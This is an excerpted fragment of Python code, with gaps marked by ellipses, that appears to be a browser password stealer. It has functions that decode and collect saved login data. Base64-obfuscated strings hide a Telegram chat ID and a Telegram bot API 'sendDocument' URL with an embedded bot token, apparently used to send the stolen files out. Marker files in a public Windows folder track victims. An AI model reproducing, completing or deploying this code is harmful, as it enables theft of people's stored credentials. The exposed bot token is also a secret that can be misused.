...
fud = base64.b64decode("NTE4NjY4MDYyNQ==").decode('utf-8')
...
def decodeLoginData(data):
  asn1data = decoder.decode(base64.b64decode(data)) # decodage base64, puis ASN1
...
def getLoginData(afkk):
  ...
  return logins
crypt = base64.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYyMDc0NTE3NTE6QUFIVk1LQkV4dVpnSjNTLTI3MUdvUmFYZGdvT2Y3UlNoaDgvc2VuZERvY3VtZW50").decode('utf-8')
...
def demso() :
    path_demso = r"C:\Users\Public\Documents\number.txt"
...
def id() :
    path_id = r"C:\Users\Public\Documents\id.txt"
